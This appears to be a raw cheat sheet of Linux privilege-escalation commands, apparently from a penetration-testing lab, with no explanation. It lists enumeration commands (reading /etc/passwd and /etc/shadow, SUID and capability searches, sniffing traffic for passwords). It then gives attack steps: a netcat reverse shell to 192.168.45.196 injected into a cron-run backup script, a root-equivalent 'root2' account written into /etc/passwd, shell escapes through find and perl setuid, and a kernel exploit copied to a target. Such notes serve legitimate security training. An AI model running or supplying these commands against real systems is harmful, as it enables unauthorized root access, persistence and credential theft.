ls -l /etc/shadow
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
ps aux
ip a
routel
ss -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo libata
find / -perm -u=s -type f 2>/dev/null
env
cat .bashrc
su - root
sudo -l
sudo -i
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"

grep "CRON" /var/log/syslog

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.196 1234 >/tmp/f" >> user_backups.sh
nc -lnvp 1234

openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

/usr/sbin/getcap -r / 2>/dev/null

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

scp cve-2017-16995.c joe@192.168.123.216:
